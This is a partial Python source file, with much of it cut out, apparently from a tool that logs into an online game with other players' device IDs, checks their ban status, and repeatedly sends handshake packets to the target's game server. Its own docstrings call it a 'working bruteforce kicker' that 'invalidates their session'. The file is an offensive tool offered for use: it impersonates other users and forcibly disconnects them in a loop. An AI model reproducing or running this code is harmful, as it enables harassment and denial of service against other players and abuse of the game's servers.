...
Working bruteforce kicker + full player/ban checks.
"""
    ...
    def run(self):
        try:
            ...
            if pid == 2 and res:
                ...
                zone_raw = res.get(2)
                zone = None
                if isinstance(zone_raw, (list, tuple)) and zone_raw: zone = zone_raw[0]
                elif isinstance(zone_raw, int): zone = zone_raw
                if is_guest_account(acc): return None, None, "UNREGISTERED"
                return acc, zone, "NORMAL"
            return None, None, f"FAIL (PID: {pid})"
        except ConnectionError: return None, None, "ABORTED"
...
class GameConnection(BaseConnection):
    ...
    def login_to_login_server(self) -> bool:
        ...
        self.send_data(1, SdpStruct({0: self.device_id, 1: self.auth_str,
            2: CLIENT_VERSION, 3: self.channel, 4: LANGUAGE}))
        for _ in range(4):
            ...
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                ...
                if (raw_reason not in (None, "", 0, "0")) or total > 0:
                    ...
                    return {"banned": True, "reason": friendly, "reason_raw": raw_reason,
                            "remaining": remaining, "label": label}
                return {"banned": False, "reason": "", "remaining": "", "label": "Not Banned"}
            if pid in (-1, None): break
        return {"banned": False, "reason": "", "remaining": "", "label": "Not Banned"}
...
def check_device_id(device_id: str, retries: int = 3) -> Dict[str, Any]:
    ...
    for _ in range(retries):
        ...
        try:
            ...
            conn.cleanup()
            if not result:
                last_err = "No account data returned"; time.sleep(0.4); continue
            player = extract_player_data(result)
            if not player:
                last_err = "Could not parse player data"; time.sleep(0.4); continue
...
# ============================================================
# BRUTE FORCE — the working version (from shin.py)
# ============================================================
def fetch_session_profile(device_id: str,
                          stop_event: Optional[Any] = None) -> Optional[Dict[str, Any]]:
    """Login, get game server, verify, return BF-ready profile."""
    try:
        ...
        logging.debug("fetch_session_profile error: %s", e)
        return None

def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bool, float, str]:
    """Send one PID-10001 handshake to target's game server — invalidates their session."""
    t0 = time.time()
    sock = None
    try:
...
def kick_device(device_id: str, rounds: int = 0, delay: float = 3.0,
                stop_event=None, on_progress=None) -> Dict[str, Any]:
    """Fetch profile ONCE, then loop-kick until stopped or rounds reached."""
    device_id = (device_id or "").strip()
    stats: Dict[str, Any] = {
        "attempts": 0, "hits": 0, "fails": 0, "elapsed": 0.0,
    ...
    if not ok:
        stats["status"] = "error"
        stats["error"] = f"Invalid format: {reason}"
    ...
    if not profile:
        stats["status"] = "error"
        stats["error"] = "Failed to fetch session profile (login/lookup failed or guest)"
        stats["elapsed"] = time.time() - t0
        if on_progress:
            try: on_progress(dict(stats))
            except Exception: pass
    ...
    stats["nickname"]   = profile.get("nickname", "?")
    stats["gs_info"]    = profile.get("gs_info", "?")
    stats["account_id"] = profile.get("account_id", "?")
